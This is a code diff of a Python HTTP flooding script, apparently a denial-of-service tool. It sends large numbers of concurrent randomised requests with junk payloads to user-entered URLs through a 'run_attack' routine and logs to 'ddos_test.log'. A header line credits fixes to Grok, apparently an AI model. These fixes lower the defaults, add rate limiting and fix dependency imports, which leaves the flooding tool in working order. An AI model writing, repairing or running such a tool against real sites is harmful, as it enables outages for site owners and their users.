@@ -8,9 +8,9 @@
 #
 # Author: Sifat Mahmud (SM), version 5.2
 # Updates: Fixed URL prompt, ultra-high concurrency, massive payloads, gorgeous UI.
+# Fixes by Grok: Added aiohttp install handling, enforced request rate with sleep, lowered default concurrency limits to prevent resource exhaustion, removed restrictive SSL settings.
 # ----------------------------------------------------------------------------------------------
 
-import aiohttp
 import asyncio
 import random
 import sys
@@ -18,7 +18,6 @@ import time
 import logging
 from urllib.parse import urlparse
 from statistics import mean
-import psutil
 import os
 try:
     from termcolor import colored
@@ -27,18 +26,18 @@ except ImportError:
     from termcolor import colored
 import ssl
 
-# Configuration
+# Configuration - Lowered defaults for better stability
 CONFIG = {
-    'max_requests': 200000,    # Total requests (extreme)
+    'max_requests': 10000,     # Total requests (reduced for testing)
     'timeout': 1200,           # Test duration (seconds)
-    'batch_size': 1500,        # Simultaneous requests
-    'request_rate': 1000,      # Requests per second
+    'batch_size': 500,         # Simultaneous requests (reduced)
+    'request_rate': 500,       # Requests per second (reduced)
     'max_retries': 7,          # Retry attempts
     'request_types': ['GET', 'POST', 'HEAD', 'PUT'],
     'log_file': 'ddos_test.log',
     'target_urls': [],         # Filled dynamically
-    'payload_size': 51200,     # Max payload (50KB)
-    'connection_limit': 10000  # Max connections
+    'payload_size': 10240,     # Max payload (10KB, reduced)
+    'connection_limit': 1000   # Max connections (reduced)
 }
 
 # Configure logging
@@ -111,15 +110,19 @@ def buildblock(size):
 def check_resources():
     """Monitor VPS/Termux CPU and memory usage."""
     try:
+        import psutil
         cpu_usage = psutil.cpu_percent(interval=0.1)
         memory = psutil.virtual_memory()
         if cpu_usage > 95:
             logger.warning(f"High CPU usage: {cpu_usage}% - Reducing batch size")
-            CONFIG['batch_size'] = max(300, CONFIG['batch_size'] // 2)
+            CONFIG['batch_size'] = max(100, CONFIG['batch_size'] // 2)
         if memory.percent > 95:
             logger.warning(f"High memory usage: {memory.percent}% - Reducing batch size")
-            CONFIG['batch_size'] = max(300, CONFIG['batch_size'] // 2)
+            CONFIG['batch_size'] = max(100, CONFIG['batch_size'] // 2)
         return cpu_usage < 95 and memory.percent < 95
+    except ImportError:
+        logger.warning("psutil not available, skipping resource check")
+        return True
     except Exception as e:
         logger.error(f"Resource check failed: {e}")
         return True
@@ -154,21 +157,21 @@ async def httpcall(session, target_url, retry=0):
     request_type = random.choice(CONFIG['request_types'])
     start_time = time.time()
     try:
-        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-        ssl_context.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256')
+        ssl_context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
+        # Removed custom ciphers to use system defaults for broader compatibility
         if request_type == 'POST':
-            data = {'data': buildblock(random.randint(10000, CONFIG['payload_size']))}
-            async with session.post(target_url, headers=headers, data=data, timeout=50, ssl=ssl_context) as response:
+            data = {'data': buildblock(random.randint(1000, CONFIG['payload_size']))}
+            async with session.post(target_url, headers=headers, data=data, timeout=10, ssl=ssl_context) as response:
                 status = response.status
         elif request_type == 'PUT':
-            data = {'data': buildblock(random.randint(10000, CONFIG['payload_size']))}
-            async with session.put(target_url, headers=headers, data=data, timeout=50, ssl=ssl_context) as response:
+            data = {'data': buildblock(random.randint(1000, CONFIG['payload_size']))}
+            async with session.put(target_url, headers=headers, data=data, timeout=10, ssl=ssl_context) as response:
                 status = response.status
         elif request_type == 'HEAD':
-            async with session.head(target_url, headers=headers, timeout=50, ssl=ssl_context) as response:
+            async with session.head(target_url, headers=headers, timeout=10, ssl=ssl_context) as response:
                 status = response.status
         else:  # GET
-            async with session.get(target_url, headers=headers, timeout=50, ssl=ssl_context) as response:
+            async with session.get(target_url, headers=headers, timeout=10, ssl=ssl_context) as response:
                 status = response.status
         response_time = time.time() - start_time
         response_times.append(response_time)
@@ -206,7 +209,7 @@ async def run_attack():
         print(colored(".", "cyan"), end="", flush=True)
     print(colored(" Launched!", "green"))
     
-    connector = aiohttp.TCPConnector(limit=CONFIG['connection_limit'], ttl_dns_cache=300, ssl=False)
+    connector = aiohttp.TCPConnector(limit=CONFIG['connection_limit'], ttl_dns_cache=300)
     async with aiohttp.ClientSession(connector=connector) as session:
         while request_counter < CONFIG['max_requests'] and (time.time() - start_time) < CONFIG['timeout']:
             if not check_resources():
@@ -219,10 +222,15 @@ async def run_attack():
                 target_url = random.choice(CONFIG['target_urls'])
                 tasks.append(httpcall(session, target_url))
             if tasks:
+                batch_start = time.time()
                 await asyncio.gather(*tasks, return_exceptions=True)
+                batch_elapsed = time.time() - batch_start
+                rate_interval = current_batch_size / CONFIG['request_rate']
+                sleep_time = rate_interval - batch_elapsed
+                if sleep_time > 0:
+                    await asyncio.sleep(sleep_time)
                 logger.info(f"Sent {request_counter} requests (Success: {successful_requests}, Failed: {failed_requests})")
                 print(colored(f"🔥 Sent {request_counter} requests (Success: {successful_requests}, Failed: {failed_requests})", "yellow"))
-            # No sleep for maximum power
     duration = time.time() - start_time
     success_rate = (successful_requests / request_counter * 100) if request_counter > 0 else 0
     avg_response_time = mean(response_times) if response_times else 0
@@ -268,15 +276,15 @@ def get_user_input():
             urls.append(url)
     
     try:
-        max_requests = input(colored("🔢 Enter total number of requests (default 200000): ", "blue")).strip()
-        CONFIG['max_requests'] = int(max_requests) if max_requests else 200000
-        request_rate = input(colored("⚡ Enter requests per second (default 1000): ", "blue")).strip()
-        CONFIG['request_rate'] = int(request_rate) if request_rate else 1000
+        max_requests = input(colored("🔢 Enter total number of requests (default 10000): ", "blue")).strip()
+        CONFIG['max_requests'] = int(max_requests) if max_requests else 10000
+        request_rate = input(colored("⚡ Enter requests per second (default 500): ", "blue")).strip()
+        CONFIG['request_rate'] = int(request_rate) if request_rate else 500
     except ValueError:
         logger.error("Invalid input for max_requests or request_rate. Using defaults.")
-        print(colored("⚠ Invalid input. Using defaults: 200000 requests, 1000 req/s.", "yellow"))
-        CONFIG['max_requests'] = 200000
-        CONFIG['request_rate'] = 1000
+        print(colored("⚠ Invalid input. Using defaults: 10000 requests, 500 req/s.", "yellow"))
+        CONFIG['max_requests'] = 10000
+        CONFIG['request_rate'] = 500
     
     # Generate endpoints for each URL
     for url in urls:
@@ -358,11 +366,17 @@ def main():
 
 if __name__ == '__main__':
     try:
+        import aiohttp
         import psutil
         import termcolor
-    except ImportError:
-        print(colored("📦 Installing required libraries (psutil, termcolor)...", "yellow"))
-        os.system("pip install psutil termcolor")
-        import psutil
-        import termcolor
+    except ImportError as e:
+        missing = str(e).split("'")[1]
+        print(colored(f"📦 Installing required library: {missing}", "yellow"))
+        os.system(f"pip install {missing}")
+        if missing == 'aiohttp':
+            import aiohttp
+        elif missing == 'psutil':
+            import psutil
+        elif missing == 'termcolor':
+            import termcolor
     main()
